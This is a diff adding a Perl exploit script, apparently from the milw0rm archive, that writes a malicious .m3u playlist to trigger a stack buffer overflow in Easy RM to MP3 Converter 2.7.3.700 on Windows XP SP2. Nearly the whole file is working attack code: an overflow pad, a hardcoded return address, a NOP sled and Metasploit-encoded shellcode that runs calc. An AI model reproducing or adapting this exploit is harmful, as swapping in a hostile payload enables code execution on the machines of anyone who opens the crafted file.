@@ -1,0 +1,45 @@
+#!/usr/bin/perl
+# Easy RM to MP3 Converter 2.7.3.700 (.m3u) File Universal Buffer Overflow Exploit
+# Author: Crazy_Hacker
+# Download :  http://www.rm-to-mp3.net/EasyRMtoMP3Converter.exe
+# Tested : Windows XP SP2 (En)
+# Greetz : Thugz_Hacker,Syrian Hacker,Golden_z3ro,Managerplay
+# Home : www.sec-t.com
+# viva Xhackers Team ;)
+# welcome back Milw0rm
+
+print "\n\n################################################## \n";
+print "Exploit By : Crazy_Hacker \n";
+print "Vurnable Pro : Easy RM to MP3 Converter 2.7.3.700 \n";
+print "Tested on : Windows XP SP2 (En) \n";
+print "Description : Stack Local Buffer Oveflow \n";
+print "File type : .m3u \n";
+print "################################################## \n";
+$junk = "\x41" x 26061;
+$ret = "\x0F\x3F\xA1\x01"; # => Universal Address (MSRMCcodec02.dll)
+$nopsled = "\x90" x 20;
+# windows/exec - 144 bytes   thanks to metasploit    Encoder: x86/shikata_ga_nai   EXITFUNC=seh, CMD=calc
+$shellcode =
+"\xdb\xdf\xbd\xe4\x47\x45\x20\xd9\x74\x24\xf4\x5f\x33\xc9" .
+"\xb1\x1e\x83\xef\xfc\x31\x6f\x14\x03\x6f\xf0\xa5\xb0\xdc" .
+"\x10\x6d\x3b\x1d\xe0\xe5\x7e\x21\x6b\x85\x85\x21\x6a\x99" .
+"\x0d\x9e\x74\xee\x4d\x01\x85\x1b\x38\xca\xb1\x50\xba\x22" .
+"\x88\xa6\x24\x16\x6e\xe6\x23\x60\xaf\x2d\xc6\x6f\xed\x59" .
+"\x2d\x54\xa5\xb9\xca\xde\xa0\x49\x8d\x04\x2b\xa5\x54\xce" .
+"\x27\x72\x12\x8f\x2b\x85\xcf\xbb\x4f\x0e\x0e\x57\xe6\x4c" .
+"\x35\xa3\x3b\x33\x04\x5d\xdb\x9a\x02\x2a\x5d\x13\x40\x6c" .
+"\x6d\xd8\x26\x71\xc0\x55\xae\x81\x93\x92\xac\x52\xc9\x32" .
+"\xdb\xa2\x87\xb7\x44\x2b\x0f\x49\xf0\xa5\x78\x49\xe2\xd9" .
+"\xe7\xd9\x8e\x1d";
+
+
+$exploit = $junk.$ret.$nopsled.$shellcode;
+
+print "\n[+] Creating Exploit File ...\n";
+open($cc ,">Exploit.m3u");
+print $cc $exploit;
+close($cc);
+
+print "[+] Exploit File Created (Exploit.m3u)\n";
+
+# milw0rm.com [2009-07-16]
